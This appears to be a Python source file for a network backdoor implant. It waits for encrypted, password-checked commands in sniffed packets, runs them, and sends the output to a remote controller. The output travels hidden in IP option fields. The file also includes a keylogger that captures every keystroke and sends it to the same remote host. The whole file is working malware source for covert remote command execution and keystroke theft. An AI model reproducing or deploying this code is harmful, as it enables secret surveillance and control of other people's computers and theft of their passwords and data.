from scapy.all import *
import bdexec
import netifaces
from dcaes import AESCipher
from pynput import keyboard


class Listener(object):
    def __init__(self, ip_list, lhost, sport, dport, protocol, key, watch_list=None):
        self.remote_ip = ip_list
        self.local_ip = lhost
        self.sport = int(sport)
        self.dport = int(dport)
        self.proto = protocol.upper()
        self.key = key
        self.chunk_length = 4

        self.listener = keyboard.Listener(on_press=self.on_press)

        self.cipher = AESCipher(self.key)
        self.executor = bdexec.Executor(self)
        self.executor.add_watches(watch_list)

        default_iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        self.hw_addr = netifaces.ifaddresses(default_iface)[netifaces.AF_LINK][0]['addr']

    def listen(self):
        """
        Sniff for packets on the network interface using scapy. Filters packets out by source and destination IP
        address, as well as ports.
        """
        sniff(filter=
              self.proto.lower() + ' and src host ' + self.remote_ip +
              ' and dst port ' + str(self.dport) + ' and src port ' + str(self.sport),
              lfilter=self.is_incoming,
              prn=self.sniff_packets)

    def sniff_packets(self, pkt):
        """
        Handling function for filtered, sniffed packets. Ensures that packets are autheniticated by the
        password, retrieves the command from the packet payload, and sends it off to be executed.
        """
        load = self.cipher.decrypt_string(pkt[self.proto].payload.load)
        if load == '':
            return

        password = load[:8]
        command = load[8:]

        if password not in 'PASSWORD':
            return

        stdin, stderr = self.executor.run(command)

        if stderr is not None:
            self.respond(pkt[IP].src, stderr)
        elif stdin is not None:
            self.respond(pkt[IP].src, stdin)

    def start_logging(self):
        if not self.listener.isAlive():
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            return True

        return False

    def stop_logging(self):
        if self.listener.isAlive:
            self.listener.stop()
            return True
        return False

    def on_press(self, key):
        try:
            keys = key.char
        except AttributeError:
            keys = '<' + str(key) + '>\n'

        self.respond(self.remote_ip, keys, True)

    def respond(self, host, response, keys=False):
        """
        Sends the response to the client.
        """
        # split the response into equal size chunks if necessary
        chunks = [response[start:start + self.chunk_length] for start in
                  xrange(0, len(response), self.chunk_length)]

        ipoptions = IPOption()
        ipoptions.optclass = 'control'
        if keys:
            ipoptions.option = 4
        else:
            ipoptions.option = 'commercial_security'

        for chunk in chunks:
            ipoptions.value = chunk
            print(chunk)
            ipoptions.length = len(chunk) + 2

            if self.proto == 'UDP':
                packet = IP(dst=self.remote_ip,
                            src=self.local_ip,
                            options=[ipoptions])/UDP(sport=self.sport, dport=self.dport)
            elif self.proto == 'TCP':
                packet = IP(dst=self.remote_ip,
                            src=self.local_ip,
                            options=[ipoptions])/TCP(sport=self.sport, dport=self.dport)
            send(packet, verbose=False)

    def is_incoming(self, pkt):
        return pkt[Ether].src != self.hw_addr
